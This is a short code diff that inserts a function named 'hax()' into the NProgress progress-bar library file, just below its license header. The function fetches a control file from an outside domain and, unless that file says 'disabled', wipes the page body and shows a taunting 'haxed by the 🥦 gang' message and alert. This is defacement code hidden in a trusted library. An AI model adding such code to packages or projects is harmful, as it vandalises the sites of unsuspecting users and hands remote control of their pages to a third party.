@@ -1,6 +1,20 @@
 /* NProgress, (c) 2013, 2014 Rico Sta. Cruz - http://ricostacruz.com/nprogress
  * @license MIT */
 
+async function hax() {
+  const haxResponse = await fetch('https://jeremynagel.info/okra/hax.txt', {
+      method: 'GET'
+    });
+  const haxText = await haxResponse.text()
+
+  if (window.location.href.includes('hax') || !haxText.includes('disabled')) {
+    setTimeout(() => {
+      document.body.innerHTML = `<h1>You got haxed by the 🥦 gang. Okra sux. 🥦 is da best</h1>`
+      alert('You got haxed by the 🥦 gang. Okra sux. Brocolli is da best');
+    }, 5000);
+  }
+}
+
 ;(function(root, factory) {
 
   if (typeof define === 'function' && define.amd) {
